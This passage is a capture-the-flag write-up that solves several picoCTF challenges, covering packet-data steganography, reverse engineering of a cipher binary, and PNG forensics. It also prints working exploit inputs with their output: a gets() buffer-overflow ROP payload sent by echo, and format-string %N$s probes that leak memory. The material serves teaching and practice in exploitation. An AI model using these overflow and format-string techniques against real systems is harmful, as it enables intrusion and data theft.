<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;asdf.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
  d <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)

ip_src <span style="color:#f92672">=</span> {}
ip_dst <span style="color:#f92672">=</span> {}

<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> d:
  <span style="color:#75715e"># Not all packets have data, so use try and except to filter out the packets without data</span>
  <span style="color:#66d9ef">try</span>:
    a <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#e6db74">&#34;data.data&#34;</span>] <span style="color:#75715e"># Get data</span>
    src <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.src&#34;</span>] <span style="color:#75715e"># Get src ips</span>
    dst <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.dst&#34;</span>] <span style="color:#75715e"># Get destination ips</span>
  <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
    <span style="color:#66d9ef">continue</span>

  a <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
  s <span style="color:#f92672">=</span> str(bytes<span style="color:#f92672">.</span>fromhex(a), <span style="color:#e6db74">&#34;ascii&#34;</span>)

  <span style="color:#75715e"># Take the src address and take the last part</span>
  x <span style="color:#f92672">=</span> int(src<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])

  <span style="color:#75715e"># See if the last part of the src ip is actually within the ascii range</span>
  <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;</span> x <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>:
    port <span style="color:#f92672">=</span> int(p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;udp&#34;</span>][<span style="color:#e6db74">&#34;udp.srcport&#34;</span>])
    <span style="color:#66d9ef">if</span> port <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5000</span>:
      <span style="color:#66d9ef">print</span>(port)
      flag <span style="color:#f92672">+=</span> chr(port <span style="color:#f92672">-</span> <span style="color:#ae81ff">5000</span>)


<span style="color:#66d9ef">print</span>(flag)
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 go.py
...
5097
5048
5125
5097
5097
5097
5097
5097
5097
5097
5097
paaaaaicoCTF{p1LLf3aaaaar3daa_adaata_v1a_staaa3gaaaa0}aaaaaaaa
</code></pre><p>The above ouput looks very close to the flag, except that it has a bunch of a&rsquo;s. Let&rsquo;s just get rid of the a&rsquo;s.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;asdf.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
  d <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)

ip_src <span style="color:#f92672">=</span> {}
ip_dst <span style="color:#f92672">=</span> {}

<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> d:
  <span style="color:#75715e"># Not all packets have data, so use try and except to filter out the packets without data</span>
  <span style="color:#66d9ef">try</span>:
    a <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#e6db74">&#34;data.data&#34;</span>] <span style="color:#75715e"># Get data</span>
    src <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.src&#34;</span>] <span style="color:#75715e"># Get src ips</span>
    dst <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.dst&#34;</span>] <span style="color:#75715e"># Get destination ips</span>
  <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
    <span style="color:#66d9ef">continue</span>

  a <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
  s <span style="color:#f92672">=</span> str(bytes<span style="color:#f92672">.</span>fromhex(a), <span style="color:#e6db74">&#34;ascii&#34;</span>)

  <span style="color:#75715e"># Take the src address and take the last part</span>
  x <span style="color:#f92672">=</span> int(src<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])

  <span style="color:#75715e"># See if the last part of the src ip is actually within the ascii range</span>
  <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;</span> x <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>:
    port <span style="color:#f92672">=</span> int(p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;udp&#34;</span>][<span style="color:#e6db74">&#34;udp.srcport&#34;</span>])
    <span style="color:#66d9ef">if</span> port <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5000</span>:
      <span style="color:#66d9ef">print</span>(port)
      flag <span style="color:#f92672">+=</span> chr(port <span style="color:#f92672">-</span> <span style="color:#ae81ff">5000</span>)

<span style="color:#66d9ef">print</span>(flag)
<span style="color:#66d9ef">print</span>(flag<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 go.py
...
5097
5048
5125
5097
5097
5097
5097
5097
5097
5097
5097
paaaaaicoCTF{p1LLf3aaaaar3daa_adaata_v1a_staaa3gaaaa0}aaaaaaaa
picoCTF{p1LLf3r3d_dt_v1_st3g0}
</code></pre><p>When we submit <code>picoCTF{p1LLf3r3d_dt_v1_st3g0}</code> as the flag, it seems to be incorrect. We probably removed too many a&rsquo;s. With a bit of guesing we figure out that that the <code>dt</code> part of the flag should be <code>data</code> and that <code>v1</code> should be <code>v1a</code> (via), which makes the actual flag <code>picoCTF{p1LLf3r3d_data_v1a_st3g0}</code>.</p>
<h2 id="leap-frog---binary-exploitation">leap-frog - Binary Exploitation</h2>
<pre><code class="language-console" data-lang="console">$ checksec --file ./rop
[*] '/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>NX enabled means stack is writeable but not executable and No PIE means no ASLR.</p>
<p>gets() is still the vulnerable code in vuln(). This means we can still use \x00 bytes.</p>
<p>Our goal is to execute the display_flag() function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">display_flag</span>() {
  <span style="color:#66d9ef">char</span> flag[FLAG_SIZE];
  FILE <span style="color:#f92672">*</span>file;
  file <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;&#39;flag.txt&#39; missing in the current directory!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }

  fgets(flag, <span style="color:#66d9ef">sizeof</span>(flag), file);

  <span style="color:#66d9ef">if</span> (win1 <span style="color:#f92672">&amp;&amp;</span> win2 <span style="color:#f92672">&amp;&amp;</span> win3) {
    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, flag);
    <span style="color:#66d9ef">return</span>;
  }
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (win1 <span style="color:#f92672">||</span> win3) {
    printf(<span style="color:#e6db74">&#34;Nice Try! You&#39;re Getting There!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
  <span style="color:#66d9ef">else</span> {
    printf(<span style="color:#e6db74">&#34;You won&#39;t get the flag that easy..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
}
</code></pre></div><p>It looks like it looks to see if these global variables are set (non-zero):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">bool</span> win1 <span style="color:#f92672">=</span> false;
<span style="color:#66d9ef">bool</span> win2 <span style="color:#f92672">=</span> false;
<span style="color:#66d9ef">bool</span> win3 <span style="color:#f92672">=</span> false;
</code></pre></div><p>These functions are provided to set the above variables, but we don&rsquo;t have to use them:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leapA</span>() {
  win1 <span style="color:#f92672">=</span> true;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leap2</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg_check) {
  <span style="color:#66d9ef">if</span> (win3 <span style="color:#f92672">&amp;&amp;</span> arg_check <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xDEADBEEF</span>) {
    win2 <span style="color:#f92672">=</span> true;
  }
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (win3) {
    printf(<span style="color:#e6db74">&#34;Wrong Argument. Try Again.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
  <span style="color:#66d9ef">else</span> {
    printf(<span style="color:#e6db74">&#34;Nope. Try a little bit harder.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leap3</span>() {
  <span style="color:#66d9ef">if</span> (win1 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>win1) {
    win3 <span style="color:#f92672">=</span> true;
  }
  <span style="color:#66d9ef">else</span> {
    printf(<span style="color:#e6db74">&#34;Nope. Try a little bit harder.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
}
</code></pre></div><p>Setting arguments is boring according to Gynvael, so he wants to use gets() on the address of win1 to set all 3 global variables since they are adjacent to each other in memory. Then we can just call the display_flag() function. If we look at the assembly we see that <code> test   %al,%al</code> is used to check the global variables. This only tests to make sure the global vars are non zero, so we can use any non zero value to overwrite the 3 global variables.</p>
<p>Find the address of gets() using IDA or objdump or Ghidra.</p>
<pre><code class="language-console" data-lang="console">$ objdump -d ./rop
...
08048430 &lt;gets@plt&gt;:
...
080486b3 &lt;display_flag&gt;:
...
</code></pre><p>The address of gets is 0x08048430. The address of display_flag is 0x080486b3. Gynvael uses IDA to look for the address of win1, but you can use gdb as well:</p>
<pre><code class="language-console" data-lang="console">$ gdb ./rop
(gdb) p &amp;win1
$1 = (&lt;data variable, no debug info&gt; *) 0x804a03d &lt;win1&gt;
</code></pre><p>So 0x804a03d is the address of win1.</p>
<p>Let&rsquo;s look at the assembly for vuln() so we know what the stack will look like after the gets() call (you can use objdump or IDA like Gynvael does)</p>
<pre><code class="language-assembly" data-lang="assembly">08048791 &lt;vuln&gt;:
 8048791:       55                      push   %ebp
 8048792:       89 e5                   mov    %esp,%ebp
 8048794:       53                      push   %ebx
 8048795:       83 ec 14                sub    $0x14,%esp
 8048798:       e8 83 fd ff ff          call   8048520 &lt;__x86.get_pc_thunk.bx&gt;
 804879d:       81 c3 63 18 00 00       add    $0x1863,%ebx
 80487a3:       83 ec 0c                sub    $0xc,%esp
 80487a6:       8d 83 7b e9 ff ff       lea    -0x1685(%ebx),%eax
 80487ac:       50                      push   %eax
 80487ad:       e8 6e fc ff ff          call   8048420 &lt;printf@plt&gt;
 80487b2:       83 c4 10                add    $0x10,%esp
 80487b5:       83 ec 0c                sub    $0xc,%esp
 80487b8:       8d 45 e8                lea    -0x18(%ebp),%eax
 80487bb:       50                      push   %eax
 80487bc:       e8 6f fc ff ff          call   8048430 &lt;gets@plt&gt;
 80487c1:       83 c4 10                add    $0x10,%esp
 80487c4:       8b 5d fc                mov    -0x4(%ebp),%ebx
 80487c7:       c9                      leave
 80487c8:       c3                      ret
</code></pre><p>Here is what we want the stack to look like:
[ buf buffer + other stuff ]
[    address of gets()     ] # When ret is called when vuln() returns, this address will be popped off the stack
[ address of display_flag()] # This is what is popped into eip after and executed after gets() returns
[    address of  win1      ] # This is the argument of gets()</p>
<p>Here&rsquo;s the exploit:</p>
<pre><code>\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n # New lines are so that get stops getting input
</code></pre><p>We need some padding to overflow the buffer (Gynvael uses IDA to look at the stack and determine the amount needed):</p>
<pre><code>AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n`
</code></pre><p>Use echo to send it to the binary:</p>
<pre><code class="language-console" data-lang="console">$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' # -e is for interpreting the \x and the -n is to omit new line
</code></pre><p>Get the flag:</p>
<pre><code>$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' | ./rop
Enter your input&gt; picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}
Segmentation fault (core dumped)
</code></pre><p>If we wanted to do it &ldquo;properly&rdquo;, we would first put the address of leapA(), then the middle of leap3(), then leap2() with the right arguments and bytes (since there will be pop ebp instructions). Since leap3 has a <code>mov ebx, ebp + 4</code>, we would just have to put an address that is actually readable so the program doesn&rsquo;t crash.</p>
<p>A viewer asked if it&rsquo;s possible to jump to directly into the display_flag(). It might be possible since the program stores the flag in memory even before it checks if the win vars were set. However, it probably would be difficult due to a few reasons. One is that ASLR still affects the stack, just not the binary.</p>
<h2 id="reverse_cipher---reverse-engineering">reverse_cipher - Reverse Engineering</h2>
<p>We get a file and a x64 binary. The rev file contains part of the flag:</p>
<pre><code class="language-console" data-lang="console">$ less rev_this
picoCTF{w1{1wq83k055j5f}
rev_this (END)
$ file rev
rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=523d51973c11197605c76f84d4afb0fe9e59338c, not stripped
</code></pre><p>Gynvael uses IDA to look at at the binary and sees that it appends to the rev_this file.</p>
<p>Part of the decompilation (using Ghidra since I don&rsquo;t have IDA):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_20 <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
local_28 <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;rev_this&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
<span style="color:#66d9ef">if</span> (local_20 <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
  puts(<span style="color:#e6db74">&#34;No flag found, please make sure this is run on the server&#34;</span>);
}
<span style="color:#66d9ef">if</span> (local_28 <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
  puts(<span style="color:#e6db74">&#34;please run this on the server&#34;</span>);
}
</code></pre></div><p>Reads 24 bytes or 0x18 bytes</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sVar1 <span style="color:#f92672">=</span> fread(local_58,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">1</span>,local_20)
</code></pre></div><p>Just copies first 8 bytes</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
<span style="color:#66d9ef">while</span> (local_10 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>) {
  local_9 <span style="color:#f92672">=</span> local_58[local_10];
  fputc((<span style="color:#66d9ef">int</span>)local_9,local_28);
  local_10 <span style="color:#f92672">=</span> local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>The following just checks whether the index is even or odd. If it&rsquo;s odd it decrements by 2 and if it&rsquo;s even it adds 5. Do this for the rest of the bytes in flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
<span style="color:#66d9ef">while</span> ((<span style="color:#66d9ef">int</span>)local_14 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x17</span>) {
  <span style="color:#66d9ef">if</span> ((local_14 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
    local_9 <span style="color:#f92672">=</span> local_58[(<span style="color:#66d9ef">int</span>)local_14] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x05&#39;</span>;
  }
  <span style="color:#66d9ef">else</span> {
    local_9 <span style="color:#f92672">=</span> local_58[(<span style="color:#66d9ef">int</span>)local_14] <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
  }
  fputc((<span style="color:#66d9ef">int</span>)local_9,local_28);
  local_14 <span style="color:#f92672">=</span> local_14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>Use python to reverse the operations above (add instead of subtract, subtract instead of add):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">d <span style="color:#f92672">=</span> bytearray(open(<span style="color:#e6db74">&#34;rev_this&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>).read())

<span style="color:#66d9ef">for</span> i in range(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">23</span>)<span style="color:#f92672">:</span>
  <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
    d[i] <span style="color:#f92672">-=</span> <span style="color:#ae81ff">5</span>
  <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
    d[i] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>

print(d)
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 asdf.py
bytearray(b'picoCTF{r3v3rs35f207e7a}')
</code></pre><h2 id="stringzz---binary-exploitation">stringzz - Binary Exploitation</h2>
<pre><code class="language-console" data-lang="console">$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols   
$ file vuln
vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=a716593e6e1b674f3f5c310077ba3da3fae42650, not stripped    
</code></pre><p>All protections are enabled :)</p>
<p>Source:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> (<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
    puts(<span style="color:#e6db74">&#34;input whatever string you want; then it will be printed back:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">int</span> read;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input <span style="color:#f92672">=</span> NULL;
    getline(<span style="color:#f92672">&amp;</span>input, <span style="color:#f92672">&amp;</span>len, stdin);
    <span style="color:#75715e">//There is no win function, but the flag is wandering in the memory!
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>)<span style="color:#f92672">*</span>FLAG_BUFFER);
    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input); <span style="color:#75715e">// Basicallly printf(input);
</span><span style="color:#75715e"></span>    fflush(stdout);
}
</code></pre></div><p><code>printMessage1(input);</code> basically calls printf(input) which is the format string bug. In order to be able to exploit the format string vulnerability, you need to be able to control the format string (<code>input</code> in this case) and also the stack after <code>input</code>.</p>
<p>Some handy format strings for exploitation:
<code>%7$s</code> takes the 7th item on the stack and reads from that address
<code>%n</code> writes an int
<code>%hn</code> writes a short
<code>%hhn</code> writes a byte
You write the number of outputted bytes using the %n above.</p>
<p>E.g. <code>printf(&quot;AAAA%n&quot;, asdf)</code> would write 4 bytes to asdf</p>
<p>This line of code puts the address of the flag onto the stack which fulfills the requirement listed above.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>)<span style="color:#f92672">*</span>FLAG_BUFFER);
</code></pre></div><p>Let&rsquo;s test the program:</p>
<pre><code class="language-console" data-lang="console">$ echo '%x' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

a
</code></pre><p>Since <code>a</code> is printed out, it means that there was a decimal 10 somewhere on the stack. This shows us that there is indeed a format string vulnerability in the program.</p>
<p>This tries to read from the first thing on the stack. It crashes because the program is trying to read from address 0xa.</p>
<pre><code class="language-console" data-lang="console">$ echo '%1$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

Segmentation fault (core dumped)
</code></pre><p>Now we can just incrementing the 1 in <code>'%1$s'</code> until we find the location of the flag.</p>
<pre><code class="language-console" data-lang="console">$ echo '%2$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

Ǖ
$ echo '%3$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

û
$ echo '%4$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

lM
echo '$%5$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:


</code></pre><p>and so on&hellip;</p>
<p>Gynvael keeps doing this until he gets to 37:</p>
<pre><code class="language-console" data-lang="console">$ echo '%37$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

picoCTF{str1nG_CH3353_0814bc7c}
</code></pre><p>If you needed to, you could probably just script it to make it faster.</p>
<h2 id="investigative-reversing-1---forensics">Investigative Reversing 1 - Forensics</h2>
<p>If you look at the ends of the 3 pngs given, you&rsquo;ll notice that there seems to be parts of the flag at the end of the file.</p>
<p>PNGs are encoded in chunks which contain the size, name, and checksum of the chunks. At the end of the PNGs, each PNG has a chunk ending in the the same checksum: <code>AE 42 60 82</code>. So anything after these bytes are part of the flag. Here are the ending bytes from each of PNGs:</p>
<p>mystery.png: <code>CF{An1_37d24ffd}</code><br>
mystery1.png: 0x85 0x73<br>
mystery2.png: <code>icT0tha_</code></p>
<p>Now open the binary in IDA (or ghidra) and decompile:</p>
<p>Opens the files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  stream <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;mystery.png&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
  g <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;mystery2.png&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
  h <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;mystery3.png&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>);
</code></pre></div><p>Reads the flag.txt:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">fread(local_38,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">1</span>,stream);
</code></pre></div><p>The following just takes three chars of the flag and output into h, or mystery3.png:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">fputc((<span style="color:#66d9ef">int</span>)local_38[<span style="color:#ae81ff">1</span>],h);
...
fputc((<span style="color:#66d9ef">int</span>)local_38[<span style="color:#ae81ff">2</span>],h);
...
fputc((<span style="color:#66d9ef">int</span>)local_33,h);
...
</code></pre></div><p>Then this takes chars from 10 to 14 and put it in h (mystery3.png)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_64 <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
<span style="color:#66d9ef">while</span> (local_64 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xf</span>) {
  fputc((<span style="color:#66d9ef">int</span>)local_38[local_64],h);
  local_64 <span style="color:#f92672">=</span> local_64 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>That means <code>0tha_</code> are the 10th to 14th chars from flag.txt.</p>
<p>The flag should look something like this:
<code>picoCTF{AAAAAAAAAAAAAAAAAAAAAAAAA}</code> where the A&rsquo;s are just placeholder characters.</p>
<p>Now that we know that <code>0tha_</code> is from index 10 to 15, then we can replace the A&rsquo;s to form the following:
<code>picoCTF{AA0tha_AAAAAAAAAA}</code></p>
<p>This takes characters from index 6 to 9 from flag.txt and writes to f (mystery.png):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_68 <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
<span style="color:#66d9ef">while</span> (local_68 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>) {
  local_6b <span style="color:#f92672">=</span> local_6b <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x01&#39;</span>;
  fputc((<span style="color:#66d9ef">int</span>)local_38[local_68],f);
  local_68 <span style="color:#f92672">=</span> local_68 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>That means that the chars from above would look something like <code>F{AA</code> which matches closely with <code>F{An</code> from mystery.png. So we combine that with what we have already for the flag:</p>
<pre><code>picoCTF{An0tha_AAAAAAAAAA}
</code></pre><p>This goes from 15 to the end of the flag and appends it to the end of f (mystery.png):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">local_60 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf</span>;
<span style="color:#66d9ef">while</span> (local_60 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1a</span>) {
  fputc((<span style="color:#66d9ef">int</span>)local_38[local_60],f);
